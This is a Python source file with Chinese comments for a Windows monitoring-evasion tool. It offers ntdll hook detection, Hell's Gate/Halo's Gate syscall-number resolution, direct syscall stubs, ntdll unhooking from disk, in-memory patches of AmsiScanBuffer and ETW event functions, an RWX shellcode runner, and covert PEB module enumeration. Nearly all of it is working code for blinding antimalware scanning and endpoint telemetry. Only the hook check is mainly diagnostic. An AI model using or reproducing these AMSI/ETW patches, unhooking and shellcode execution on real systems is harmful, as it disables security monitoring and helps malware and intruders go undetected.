#!/usr/bin/env python3
"""evasion.py -- 用户态监控绕过：直接 syscall / unhook / AMSI / ETW / hook 检测。

  evasion.py hooks                    检测 ntdll 里的 inline hook（内存 vs 磁盘）
  evasion.py ssn [--func NAME]        解析 Nt* 的系统调用号
  evasion.py syscall NAME --args ...  用自建 stub 发 syscall，不经过 ntdll
  evasion.py unhook                   从 KnownDlls 还原 ntdll 的 .text
  evasion.py amsi                     patch AMSI（当前进程）
  evasion.py etw                      patch ETW（当前进程）
  evasion.py sc --asm "..." | --hex ...   汇编/验证/执行 shellcode
  evasion.py peb                      遍历 PEB 模块链（隐蔽枚举）

只操作当前进程，不需要管理员，重启即恢复。
"""
from __future__ import annotations

import ctypes
import ctypes.wintypes as wt
import json
import os
import struct
import sys
from pathlib import Path

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

k32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll = ctypes.WinDLL("ntdll")

MEM_COMMIT, MEM_RESERVE, MEM_RELEASE = 0x1000, 0x2000, 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
PAGE_READWRITE = 0x04
PAGE_READONLY = 0x02

k32.VirtualAlloc.restype = ctypes.c_void_p
k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wt.DWORD, wt.DWORD]
k32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wt.DWORD]
k32.VirtualProtect.restype = wt.BOOL
k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wt.DWORD, ctypes.POINTER(wt.DWORD)]

BACKUP_DIR = Path(os.path.expanduser("~")) / ".dsh-evasion"


# ── 内存工具 ─────────────────────────────────────────────────────────
def alloc_rwx(code: bytes) -> int:
    mem = k32.VirtualAlloc(None, max(0x1000, len(code) + 16),
                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not mem:
        raise OSError(f"VirtualAlloc 失败 err={ctypes.get_last_error()}")
    ctypes.memmove(mem, code, len(code))
    return mem


def protect(addr: int, size: int, new_prot: int) -> int:
    old = wt.DWORD(0)
    if not k32.VirtualProtect(ctypes.c_void_p(addr), size, new_prot, ctypes.byref(old)):
        raise OSError(f"VirtualProtect 失败 err={ctypes.get_last_error()}")
    return old.value


def export_addr(dll, name: str) -> int:
    return ctypes.cast(getattr(dll, name), ctypes.c_void_p).value


# ── Hell's Gate / Halo's Gate ────────────────────────────────────────
def read_bytes(addr: int, n: int) -> bytes:
    return ctypes.string_at(addr, n)


def parse_stub(addr: int) -> tuple[int, str] | None:
    """一个 NT stub 的开头固定是：
         4C 8B D1        mov r10, rcx
         B8 xx xx xx xx  mov eax, SSN
       之后有几种变体：
         0F 05                 syscall            ← 最常见
         F6 04 25 08 03 FE 7F 01  test byte [KUSER_SHARED_DATA+0x308], 1
                                （Windows 用来判断该走 syscall 还是 int 2e）
    返回值第二位是形态标签，调用方只关心能否拿到 SSN。
    """
    b = read_bytes(addr, 24)
    if len(b) < 8:
        return None
    if b[:3] != b"\x4c\x8b\xd1" or b[3] != 0xB8:
        return None
    ssn = struct.unpack("<I", b[4:8])[0]

    if b[8:10] == b"\x0f\x05":
        return ssn, "clean-syscall"
    if b[8:10] == b"\xf6\x04":          # test byte [KUSER_SHARED_DATA...]
        return ssn, "clean-kuser"
    if b[8] in (0x0f, 0xe9, 0xeb):
        return ssn, "clean-tail"
    return ssn, "clean-other"


def ntdll_base() -> int:
    """已加载 DLL 的 HMODULE 就是内存基址。"""
    return ctypes.cast(ntdll._handle, ctypes.c_void_p).value


def collect_nt_exports() -> list[tuple[str, int]]:
    """枚举 ntdll 里所有 Nt* 导出及**内存中的真实地址**。

    注意：不能靠 dir(ctypes.WinDLL)，它枚举不到导出函数。
    做法是解析磁盘 PE 的导出表拿名字，再逐个 GetProcAddress 换成内存地址
    ——这样拿到的地址就是被 EDR hook 过的那个，正是我们要检查的对象。
    """
    import pefile

    ntdll_path = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "ntdll.dll"
    try:
        pe = pefile.PE(str(ntdll_path), fast_load=True)
        pe.parse_data_directories(
            directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]])
    except Exception:
        return []

    names = []
    exp = getattr(pe, "DIRECTORY_ENTRY_EXPORT", None)
    if exp:
        for sym in exp.symbols:
            if not sym.name:
                continue
            try:
                nm = sym.name.decode("latin1")
            except Exception:
                continue
            if nm.startswith("Nt") and not nm.startswith("Ntdll"):
                names.append(nm)
    try:
        pe.close()
    except Exception:
        pass

    k32.GetProcAddress.restype = ctypes.c_void_p
    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    handle = ctypes.c_void_p(ntdll_base())

    out = []
    for nm in names:
        addr = k32.GetProcAddress(handle, nm.encode())
        if addr:
            out.append((nm, addr))
    out.sort(key=lambda x: x[1])
    return out


def resolve_ssn(name: str, exports: list[tuple[str, int]] | None = None) -> tuple[int | None, str]:
    """Hell's Gate 优先；目标被 hook 就用 Halo's Gate 从邻居推算。"""
    exports = exports or collect_nt_exports()
    addrs = dict(exports)
    if name not in addrs:
        return None, "not-found"

    addr = addrs[name]
    got = parse_stub(addr)
    # 只要解析出 SSN 就算拿到，不管后面是 syscall 还是 KUSER_SHARED_DATA 检查
    if got and got[0] is not None:
        return got[0], f"hells-gate({got[1]})"

    # Halo's Gate：往两边找最近的 clean 邻居，按序号差推算
    idx = next(i for i, (n, _) in enumerate(exports) if n == name)
    for step in (1, 2, 3, 4, 5, 6, 7, 8):
        for j in (idx - step, idx + step):
            if 0 <= j < len(exports):
                nb_name, nb_addr = exports[j]
                nb = parse_stub(nb_addr)
                if nb and nb[0] is not None:
                    ssn = nb[0] - (idx - j) if j < idx else nb[0] + (j - idx)
                    return ssn, f"halos-gate(via {nb_name})"
    return None, "hooked-no-neighbor"


def make_stub(ssn: int) -> bytes:
    return bytes([0x4C, 0x8B, 0xD1, 0xB8]) + struct.pack("<I", ssn) + bytes([0x0F, 0x05, 0xC3])


# ── 命令：hooks ──────────────────────────────────────────────────────
def disk_ntdll_text() -> bytes | None:
    p = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "ntdll.dll"
    try:
        return p.read_bytes()
    except Exception:
        return None


def ntdll_image_range() -> tuple[int, int]:
    """ntdll 在内存里的 [起始, 结束)。

    不能用「导出函数地址的 min/max」——ntdll 内部实现（如 NtQuerySystemTime
    转发到 RtlGetSystemTime）落在导出区之外但仍属 ntdll，会被误判成外部 hook。
    正确做法是 基址 + PE 头里的 SizeOfImage。
    """
    base = ntdll_base()
    try:
        import pefile
        ntdll_path = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "ntdll.dll"
        pe = pefile.PE(str(ntdll_path), fast_load=True)
        size = pe.OPTIONAL_HEADER.SizeOfImage
        pe.close()
        if size:
            return base, base + size
    except Exception:
        pass
    return base, base + 0x300000


def cmd_hooks(args):
    exports = collect_nt_exports()
    if not exports:
        print("拿不到 ntdll 导出，无法检查")
        return 1
    lo, hi = ntdll_image_range()
    print(f"ntdll 导出 Nt* 函数: {len(exports)} 个")
    print(f"ntdll 镜像范围: {hex(lo)} - {hex(hi)}\n")

    hooked, clean = [], 0
    for name, addr in exports:
        got = parse_stub(addr)
        if got:
            clean += 1
            continue

        head = read_bytes(addr, 16)
        kind, target = "未知", None
        if head[0] == 0xE9:               # 相对 jmp rel32
            rel = struct.unpack("<i", head[1:5])[0]
            target = addr + 5 + rel
            kind = "e9 相对 jmp"
        elif head[0] == 0xEB:             # 短 jmp
            target = addr + 2 + struct.unpack("<b", head[1:2])[0]
            kind = "eb 短 jmp"
        elif head[:2] == b"\xff\x25":     # 间接 jmp
            kind = "ff25 间接 jmp"
        elif head[0] == 0x68:             # push+ret
            kind = "push+ret"

        # 关键：jmp 目标还在 ntdll 导出区里 = Windows 自己的 forwarder，不是 hook
        if target is not None and lo <= target <= hi:
            kind += f" → ntdll 内部 {hex(target)}（forwarder，非 hook）"
            clean += 1
        else:
            if target is not None:
                kind += f" → 外部 {hex(target)}"
            hooked.append((name, addr, kind, head.hex()))

    print(f"标准 stub : {clean}")
    print(f"疑似被改  : {len(hooked)}")
    if hooked:
        print("\n可疑函数（jmp 跳到 ntdll 之外，可能有东西在监控）：")
        for name, addr, kind, hx in hooked:
            print(f"  {name:<32} {hex(addr):<14} {kind}")
            print(f"    {'':<32} 首字节 {hx}")
    else:
        print("\n全部标准或仅 ntdll 内部转发，没检测到外部 hook。")
    return 0


# ── 命令：ssn ────────────────────────────────────────────────────────
def cmd_ssn(args):
    exports = collect_nt_exports()
    targets = [(args.func, dict(exports)[args.func])] if args.func else exports
    if args.func and args.func not in dict(exports):
        print(f"没有这个导出: {args.func}")
        return 1
    print(f"{'函数':<36} {'SSN':>6}  来源")
    print("-" * 70)
    for name, _addr in targets:
        ssn, how = resolve_ssn(name, exports)
        if ssn is None:
            print(f"{name:<36} {'?':>6}  {how}")
        else:
            print(f"{name:<36} 0x{ssn:02x}  {how}")
    return 0


# ── 命令：syscall ────────────────────────────────────────────────────
def cmd_syscall(args):
    exports = collect_nt_exports()
    ssn, how = resolve_ssn(args.func, exports)
    if ssn is None:
        print(f"拿不到 {args.func} 的 SSN（{how}）")
        return 1
    stub = make_stub(ssn)
    print(f"{args.func}: SSN=0x{ssn:02x} ({how})")
    print(f"stub: {stub.hex()}")

    mem = alloc_rwx(stub)
    argv = [int(x.strip(), 0) for x in (args.args or "").split(",") if x.strip()]
    argc = len(argv)
    types = [ctypes.c_ulong] * 0
    # 最多 8 个参数
    proto = ctypes.CFUNCTYPE(ctypes.c_ulong, *([ctypes.c_void_p] * max(1, argc)))
    fn = proto(mem)
    try:
        status = fn(*[ctypes.c_void_p(v) for v in argv]) if argc else fn(ctypes.c_void_p(0))
    except Exception as e:
        print(f"调用失败: {e}")
        k32.VirtualFree(mem, 0, MEM_RELEASE)
        return 1
    finally:
        pass
    st = status & 0xFFFFFFFF
    print(f"\nNTSTATUS = 0x{st:08x}  ({'SUCCESS' if st == 0 else 'FAIL'})")
    k32.VirtualFree(mem, 0, MEM_RELEASE)
    return 0 if st == 0 else 1


# ── 命令：unhook ─────────────────────────────────────────────────────
def cmd_unhook(args):
    """从磁盘 ntdll 取 .text 节原始字节，覆盖回内存。"""
    disk = disk_ntdll_text()
    if not disk:
        print("读不到磁盘 ntdll")
        return 1
    exports = collect_nt_exports()
    if not exports:
        print("拿不到 ntdll 导出")
        return 1
    text_lo = min(a for _, a in exports)
    text_hi = max(a for _, a in exports)
    size = text_hi - text_lo + 0x200

    # 磁盘上同样偏移的字节（DLL 已映射时 RVA ≈ 文件偏移对齐，这里用节表算）
    import pefile
    try:
        pe = pefile.PE(data=disk, fast_load=True)
    except Exception as e:
        print(f"解析磁盘 PE 失败: {e}")
        return 1
    # 关键：用**运行时加载基址**算 RVA，不能用磁盘 PE 的 ImageBase
    # ——ASLR 会让两者相差很远，算出来就落在任何节之外（实测踩过）。
    runtime_base = ntdll_base()
    rva_lo = text_lo - runtime_base
    rva_hi = text_hi - runtime_base
    chunk = None
    for sec in pe.sections:
        sv = sec.VirtualAddress
        if sv <= rva_lo < sv + max(sec.Misc_VirtualSize, sec.SizeOfRawData):
            off = sec.PointerToRawData + (rva_lo - sv)
            n = min(size, len(disk) - off)
            chunk = disk[off:off + n]
            sec_name = sec.Name.rstrip(b"\x00").decode("latin1", "replace")
            print(f"运行时基址 {hex(runtime_base)}  RVA {hex(rva_lo)}")
            print(f"源节 {sec_name}  file_off={hex(off)}  {n} 字节")
            break
    pe.close()
    if not chunk:
        print("定位 .text 失败")
        return 1

    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    bak = BACKUP_DIR / f"ntdll_{os.getpid()}.bin"
    before = read_bytes(text_lo, len(chunk))
    bak.write_bytes(before)
    print(f"原字节已备份: {bak}  ({len(before)} 字节)")

    diff = sum(1 for a, b in zip(before, chunk) if a != b)
    print(f"内存 vs 磁盘差异字节: {diff} / {len(chunk)}")

    old = protect(text_lo, len(chunk), PAGE_EXECUTE_READWRITE)
    ctypes.memmove(text_lo, chunk, len(chunk))
    protect(text_lo, len(chunk), old)
    print(f"已还原，内存保护恢复为 0x{old:x}")

    leftover = sum(1 for a, b in zip(read_bytes(text_lo, len(chunk)), chunk) if a != b)
    print(f"还原后仍不一致: {leftover} 字节"
          f"{'  (完全还原)' if leftover == 0 else '  (部分字节只读或被二次 hook)'}")
    return 0


# ── 命令：amsi ───────────────────────────────────────────────────────
def cmd_amsi(args):
    try:
        amsi = ctypes.WinDLL("amsi")
    except OSError:
        print("amsi.dll 未加载。先跑一次会触发 AMSI 的操作（如 PowerShell 脚本块），或手动 LoadLibrary。")
        try:
            amsi = ctypes.WinDLL("amsi.dll")
        except OSError as e:
            print(f"LoadLibrary 失败: {e}")
            return 1

    addr = export_addr(amsi, "AmsiScanBuffer")
    before = read_bytes(addr, 32)
    print(f"AmsiScanBuffer @ {hex(addr)}")
    print(f"原字节: {before[:16].hex()}")

    # 返回 E_INVALIDARG? 不——惯例是让它直接返回 0(S_OK) 且结果写 CLEAN
    # 32 字节的经典 patch:  mov eax, 0x80070057 -> 不行
    # 用简单版: xor eax,eax (返回 S_OK) + 把第 6 个参数(*result) 设为 0(CLEAN)
    # 参数: (buf, length, contentName, session, win32, amsiResult)
    # 这里用最稳的写法：直接 ret 0（调用方把返回值当 HRESULT，0 = S_OK）
    # 但 result 可能未被写。补充：把 amsiResult 指针写 0 需要 shellcode。
    # 采用社区常用的 13 字节 patch:
    #   xor eax,eax           33 C0
    #   mov [r9], eax         41 89 01     ; amsiResult = 0 (AMSI_RESULT_CLEAN)
    #   add rsp, 0x18         48 83 C4 18
    #   ret                   C3
    patch = bytes([0x33, 0xC0, 0x41, 0x89, 0x01, 0x48, 0x83, 0xC4, 0x18, 0xC3])
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    bak = BACKUP_DIR / f"amsi_{os.getpid()}.bin"
    bak.write_bytes(read_bytes(addr, len(patch)))
    print(f"原字节已备份: {bak}")

    old = protect(addr, len(patch), PAGE_EXECUTE_READWRITE)
    ctypes.memmove(addr, patch, len(patch))
    protect(addr, len(patch), old)
    print(f"已 patch: {patch.hex()}")
    print(f"patch 后: {read_bytes(addr, len(patch)).hex()}")
    print("\nAMSI 在本进程内已失效（AmsiScanBuffer 恒返回 CLEAN）")
    return 0


# ── 命令：etw ────────────────────────────────────────────────────────
def cmd_etw(args):
    targets = ["EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteEx"]
    patched = 0
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    for name in targets:
        try:
            addr = export_addr(ntdll, name)
        except Exception:
            continue
        # xor eax,eax; ret  → 返回 0 且不发事件
        patch = bytes([0x33, 0xC0, 0xC3])
        bak = BACKUP_DIR / f"etw_{name}_{os.getpid()}.bin"
        bak.write_bytes(read_bytes(addr, len(patch)))
        old = protect(addr, len(patch), PAGE_EXECUTE_READWRITE)
        ctypes.memmove(addr, patch, len(patch))
        protect(addr, len(patch), old)
        print(f"{name:<22} @ {hex(addr)}  → 33c0c3  (备份 {bak.name})")
        patched += 1
    if not patched:
        print("没找到可 patch 的 ETW 导出")
        return 1
    print(f"\n已 patch {patched} 个 ETW 写入口，本进程的事件不再上报")
    return 0


# ── 命令：sc ─────────────────────────────────────────────────────────
def cmd_sc(args):
    if args.hex:
        code = bytes.fromhex(args.hex.replace(" ", ""))
    elif args.asm:
        try:
            from keystone import Ks, KS_ARCH_X86, KS_MODE_64
        except ImportError:
            print("需要 keystone：python -m pip install keystone-engine\n"
                  "或者用 --hex 直接给机器码")
            return 2
        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            enc, cnt = ks.asm(args.asm)
            code = bytes(enc)
            print(f"汇编 {cnt} 条 → {len(code)} 字节")
        except Exception as e:
            print(f"汇编失败: {e}")
            return 1
    else:
        print("给 --asm 或 --hex")
        return 1

    print(f"机器码: {code.hex()}")
    try:
        import capstone
        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        print("反汇编自查:")
        for i in md.disasm(code, 0):
            print(f"  {i.address:04x}  {i.bytes.hex():<16} {i.mnemonic:<8} {i.op_str}")
    except ImportError:
        pass

    if not args.exec:
        print("\n(未执行。加 --exec 真的跑)")
        return 0

    mem = alloc_rwx(code)
    print(f"\n分配到 {hex(mem)} (RWX)，执行…")
    # 通用调用：无参，返回 int
    proto = ctypes.CFUNCTYPE(ctypes.c_ulonglong)
    fn = proto(mem)
    try:
        r = fn()
        print(f"返回: {hex(r)}  ({r})")
    except Exception as e:
        print(f"执行出错: {e}")
    finally:
        k32.VirtualFree(mem, 0, MEM_RELEASE)
    return 0


# ── 命令：peb ────────────────────────────────────────────────────────
def cmd_peb(args):
    """通过 PEB 枚举已加载模块，不调 EnumProcessModules / Psapi。

    NtCurrentTeb 不是 ntdll 的真导出（编译期内联），所以直接读 gs 段：
      x64: gs:[0x30] = TEB，TEB+0x60 = PEB
    用一小段机器码把 TEB 拿出来。
    """
    # mov rax, gs:[0x30]; ret
    teb_code = bytes([0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0xC3])
    mem = alloc_rwx(teb_code)
    try:
        proto = ctypes.CFUNCTYPE(ctypes.c_void_p)
        teb = proto(mem)()
    finally:
        k32.VirtualFree(mem, 0, MEM_RELEASE)
    if not teb:
        print("拿不到 TEB")
        return 1
    print(f"TEB  @ {hex(teb)}")

    def u64(addr):
        return struct.unpack("<Q", ctypes.string_at(addr, 8))[0]

    peb = u64(teb + 0x60)
    print(f"PEB  @ {hex(peb)}")
    ldr = u64(peb + 0x18)
    print(f"Ldr  @ {hex(ldr)}")
    head = ldr + 0x20          # InMemoryOrderModuleList（不是 +0x10，那是 InLoadOrder）
    cur = u64(head)
    print(f"\n{'基址':<18} {'大小':>10}  模块")
    print("-" * 72)
    seen = 0
    while cur and cur != head and seen < 300:
        # InMemoryOrder 链里 links 位于 entry+0x10
        entry = cur - 0x10
        dll_base = u64(entry + 0x30)
        size = struct.unpack("<I", ctypes.string_at(entry + 0x40, 4))[0]
        buf_len = struct.unpack("<H", ctypes.string_at(entry + 0x58, 2))[0]
        buf_ptr = u64(entry + 0x60)
        name = ""
        if buf_len and buf_ptr:
            try:
                name = ctypes.string_at(buf_ptr, min(buf_len, 520)).decode("utf-16-le", "replace")
            except Exception:
                name = "?"
        print(f"{hex(dll_base):<18} {size:>10}  {name}")
        cur = u64(cur)
        seen += 1
    print(f"\n共 {seen} 个模块（走 PEB 链，未调用任何 Psapi/Enum API）")
    return 0


# ── main ────────────────────────────────────────────────────────────
def main():
    import argparse
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("hooks"); p.set_defaults(h=cmd_hooks)
    p = sub.add_parser("ssn"); p.add_argument("--func"); p.set_defaults(h=cmd_ssn)
    p = sub.add_parser("syscall"); p.add_argument("func"); p.add_argument("--args", default="")
    p.set_defaults(h=cmd_syscall)
    p = sub.add_parser("unhook"); p.set_defaults(h=cmd_unhook)
    p = sub.add_parser("amsi"); p.set_defaults(h=cmd_amsi)
    p = sub.add_parser("etw"); p.set_defaults(h=cmd_etw)

    p = sub.add_parser("sc")
    p.add_argument("--asm"); p.add_argument("--hex")
    p.add_argument("--exec", action="store_true")
    p.set_defaults(h=cmd_sc)

    p = sub.add_parser("peb"); p.set_defaults(h=cmd_peb)

    args = ap.parse_args()
    sys.exit(args.h(args) or 0)


if __name__ == "__main__":
    main()
